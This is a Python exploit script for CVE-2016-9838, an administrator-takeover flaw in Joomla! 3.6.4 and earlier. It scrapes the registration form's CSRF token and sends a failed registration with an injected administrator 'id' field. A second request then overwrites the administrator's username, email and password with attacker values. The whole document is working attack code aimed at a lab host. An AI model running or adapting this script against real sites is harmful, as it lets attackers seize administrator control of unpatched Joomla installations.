# CVE-2016-9838: Joomla! <= 3.6.4 Admin TakeOver
# cf
 
import bs4
import requests
import random
 
 
ADMIN_ID = 384
url = &#039;http://vmweb.lan/Joomla-3.6.4/&#039;
 
form_url = url + &#039;index.php/component/users/?view=registration&#039;
action_url = url + &#039;index.php/component/users/?task=registration.register&#039;
 
username = &#039;user%d&#039; % random.randrange(1000, 10000)
email = username + &#039;@yopmail.com&#039;
password = &#039;ActualRandomChimpanzee123&#039;
 
user_data = {
    &#039;name&#039;: username,
    &#039;username&#039;: username,
    &#039;password1&#039;: password,
    &#039;password2&#039;: password + &#039;XXXinvalid&#039;,
    &#039;email1&#039;: email,
    &#039;email2&#039;: email,
    &#039;id&#039;: &#039;%d&#039; % ADMIN_ID
}
 
session = requests.Session()
 
# Grab original data from the form, including the CSRF token
 
response = session.get(form_url)
soup = bs4.BeautifulSoup(response.text, &#039;lxml&#039;)
 
form = soup.find(&#039;form&#039;, id=&#039;member-registration&#039;)
data = {e[&#039;name&#039;]: e[&#039;value&#039;] for e in form.find_all(&#039;input&#039;)}
 
# Build our modified data array
 
user_data = {&#039;jform[%s]&#039; % k: v for k, v in user_data.items()}
data.update(user_data)
 
# First request will get denied because the two passwords are mismatched
 
response = session.post(action_url, data=data)
 
# The second will work
 
data[&#039;jform[password2]&#039;] = data[&#039;jform[password1]&#039;]
del data[&#039;jform[id]&#039;]
response = session.post(action_url, data=data)
 
print("Account modified to user: %s [%s]" % (username, email))

